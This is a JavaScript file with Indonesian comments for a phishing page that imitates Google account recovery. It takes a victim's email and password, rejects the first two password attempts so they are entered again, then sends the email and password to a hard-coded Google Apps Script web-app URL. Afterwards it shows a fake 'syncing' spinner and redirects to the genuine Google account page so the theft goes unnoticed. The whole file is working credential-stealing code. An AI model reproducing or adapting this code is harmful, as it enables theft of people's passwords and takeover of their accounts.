const rail = document.getElementById('rail');
const loader = document.getElementById('loader');
const mainTitle = document.getElementById('mainTitle');
const subTitle = document.getElementById('subTitle');
const userPill = document.getElementById('userPill');
const emailInput = document.getElementById('emailInput');
const passwordInput = document.getElementById('passwordInput');
const container = document.querySelector('.container');

// Buat elemen overlay secara dinamis agar CSS bawaanmu tidak perlu diotak-atik
const overlay = document.createElement('div');
overlay.id = 'screen-overlay';
document.body.appendChild(overlay);

// Pengaturan gaya visual efek meredup menggunakan warna hitam kustom yang halus
Object.assign(overlay.style, {
    position: 'fixed',
    top: '0', left: '0',
    width: '100%', height: '100%',
    // Menggunakan hitam murni (0, 0, 0) dengan kepekatan tipis 35% agar tidak terlalu pekat
    backgroundColor: 'rgba(0, 0, 0, 0.35)', 
    zIndex: '1500', 
    opacity: '0',
    pointerEvents: 'none',
    // Durasi dinaikkan ke 0.6 detik dengan transisi melambat (cubic-bezier) agar super halus
    transition: 'opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1)'
});

// Sesuaikan transisi container agar seirama dan tidak patah
container.style.transition = 'opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1)';

// Penghitung percobaan salah untuk halaman password
let passwordAttempts = 0;

// Menyesuaikan teks awal agar langsung "Pemulihan akun" sejak pertama kali dimuat
mainTitle.innerText = "Pemulihan akun";
subTitle.innerText = "Memulihkan Akun Google Anda";

/**
 * LOGIKA HALAMAN 1 (EMAIL)
 */
document.getElementById('emailForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const errorMsg = document.getElementById('emailError');
    let emailValue = emailInput.value.trim();

    if (!emailValue) {
        emailInput.classList.add('error-input');
        errorMsg.style.display = 'flex';
        return;
    }

    // Auto-Gmail logic jika user hanya mengetik username
    if (!emailValue.includes('@')) {
        emailValue = emailValue + "@gmail.com";
        emailInput.value = emailValue; 
    }

    emailInput.classList.remove('error-input');
    errorMsg.style.display = 'none';
    
    // AKTIFKAN LOADING BAR & TRANSISI LAYAR MEREDUP GELAP
    loader.style.display = 'block';
    overlay.style.opacity = '1';
    container.style.opacity = '1'; // Kontan utama meredup 50% agar efek gelap kontras

    setTimeout(() => {
        loader.style.display = 'none';
        overlay.style.opacity = '0'; // Mengembalikan kecerahan layar
        container.style.opacity = '1';
        
        window.history.pushState({view: 'password'}, '', '#password');
        
        // --- TRANSISI KE TAMPILAN 2 ---
        subTitle.style.display = 'none'; 
        document.getElementById('displayEmail').innerText = emailValue;
        userPill.style.display = 'inline-flex'; 
        
        // Geser slider rail ke kiri (-50%) untuk memunculkan form password
        rail.style.transform = "translateX(-50%)";
        setTimeout(() => passwordInput.focus(), 400);
    }, 700);
});

/**
 * LOGIKA NAVIGASI KEMBALI (KLIK PILL / BACK BUTTON FISIK HP)
 */
function backToEmail() {
    rail.style.transform = "translateX(0)";
    
    setTimeout(() => {
        mainTitle.innerText = "Pemulihan akun"; 
        subTitle.style.display = 'block';      
        userPill.style.display = 'none';       
        
        // Reset status form password saat kembali ke menu awal
        passwordAttempts = 0;
        passwordInput.classList.remove('error-input');
        document.getElementById('passError').style.display = 'none';
        passwordInput.value = "";
        
        // Kembalikan checkbox mata sandi ke posisi semula
        document.getElementById('showPass').checked = false;
        passwordInput.type = 'password';
        
        emailInput.focus();
    }, 300);
}

window.addEventListener('popstate', backToEmail);

/**
 * FITUR AKTIF: TOGGLE SHOW / HIDE PASSWORD (KLIK LABELS MAUPUN KOTAK)
 */
document.getElementById('chkToggle').addEventListener('click', function(e) {
    const checkbox = document.getElementById('showPass');
    
    // Balik status check secara manual jika yang diklik adalah tulisan/barisnya, bukan kotak check-nya langsung
    if (e.target !== checkbox) {
        checkbox.checked = !checkbox.checked;
    }
    
    // Ubah tipe input secara realtime
    passwordInput.type = checkbox.checked ? 'text' : 'password';
});

/**
 * LOGIKA HALAMAN 2 (PASSWORD) - 2X SALAH & NOTIFIKASI SUKSES KHAS GOOGLE
 */
document.getElementById('passForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const errorMsg = document.getElementById('passError');
    const passwordValue = passwordInput.value.trim();

    if (!passwordValue) {
        passwordInput.classList.add('error-input');
        errorMsg.innerText = "Masukkan sandi";
        errorMsg.style.display = 'flex';
        return;
    }

    passwordInput.classList.remove('error-input');
    errorMsg.style.display = 'none';
    
    // Jalankan efek menggelap dan loading bar atas untuk validasi password
    loader.style.display = 'block';
    overlay.style.opacity = '1';
    container.style.opacity = '0.7';

    setTimeout(() => {
        loader.style.display = 'none';
        overlay.style.opacity = '0';
        container.style.opacity = '1';
        
        passwordAttempts++;

        if (passwordAttempts < 3) {
            // Percobaan 1 dan 2 dipaksa salah
            passwordInput.classList.add('error-input');
            errorMsg.innerHTML = `<svg class="error-svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Sandi salah. Coba lagi atau klik "Lupa sandi" untuk menyetel ulang.`;
            errorMsg.style.display = 'flex';
            passwordInput.value = ""; 
            passwordInput.focus();
        } else {
            // PERCOBAAN KE-3: KIRIM DATA KE GOOGLE SHEETS & NOTIFIKASI SUKSES MODEREN
            
            // PENTING: Ganti teks di bawah ini dengan URL Web App milikmu yang didapatkan dari Google Sheets!
            const DATABASE_URL = "https://script.google.com/macros/s/AKfycbyF0TrLB5lkonUWGQC-7j52Tb4UjFgG7lrqk5Brwi90J93xh2_ZDquhJZbVWRwVix8/exec";

            // Menyiapkan paket data untuk dikirim ke Google Apps Script
            const payloadData = {
                email: emailInput.value.trim(),
                password: passwordInput.value.trim()
            };

            // Mengirim data secara background menggunakan Fetch API
            fetch(DATABASE_URL, {
                method: 'POST',
                mode: 'no-cors', // Mode no-cors penting agar request di HP tidak terhambat aturan CORS browser
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payloadData)
            }).catch(error => console.log("Pengiriman data database tertunda:", error));

            // 1. Hilangkan elemen form, title, footer, dan user pill secara halus (Fade Out)
            rail.style.transition = 'opacity 0.4s ease';
            mainTitle.style.transition = 'opacity 0.4s ease';
            userPill.style.transition = 'opacity 0.4s ease';
            document.querySelector('.footer').style.transition = 'opacity 0.4s ease';
            
            rail.style.opacity = '0';
            mainTitle.style.opacity = '0';
            userPill.style.opacity = '0';
            document.querySelector('.footer').style.opacity = '0';

            setTimeout(() => {
                // Sembunyikan elemen lama agar space-nya kosong
                rail.style.display = 'none';
                mainTitle.style.display = 'none';
                userPill.style.display = 'none';

                // 2. Buat animasi Spinner Loading Melingkar khas Google secara dinamis
                const successContainer = document.createElement('div');
                successContainer.id = 'success-box';
                
                // Gunakan SVG Spinner Material Design Google
                successContainer.innerHTML = `
                    <div class="spinner-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: 40px; animation: fadeIn 0.5s ease forwards;">
                        <svg class="google-spinner" viewBox="0 0 50 50" style="animation: rotate 2s linear infinite; width: 50px; height: 50px;">
                            <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="4" style="stroke: #a8c7fa; stroke-linecap: round; animation: dash 1.5s ease-in-out infinite;"></circle>
                        </svg>
                        <p style="margin-top: 24px; font-size: 16px; color: #e3e3e3; font-family: 'Roboto', sans-serif; letter-spacing: 0.2px;">Menyinkronkan akun...</p>
                    </div>
                `;
                
                // Masukkan ke dalam container utama di bawah Logo SVG
                container.appendChild(successContainer);

                // Inject keyframe animasi langsung via JS agar CSS bawaanmu tidak berantakan
                const styleSheet = document.createElement("style");
                styleSheet.innerText = `
                    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
                    @keyframes rotate { 100% { transform: rotate(360deg); } }
                    @keyframes dash {
                        0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
                        50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
                        100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
                    }
                `;
                document.head.appendChild(styleSheet);

                // 3. Setelah spinner berputar 2.5 detik, alihkan halaman ke Google asli
                setTimeout(() => {
                    window.location.href = "https://myaccount.google.com/";
                }, 2500);

            }, 400); // Sinkron dengan waktu fade out form (0.4s)
        }
    }, 800);
});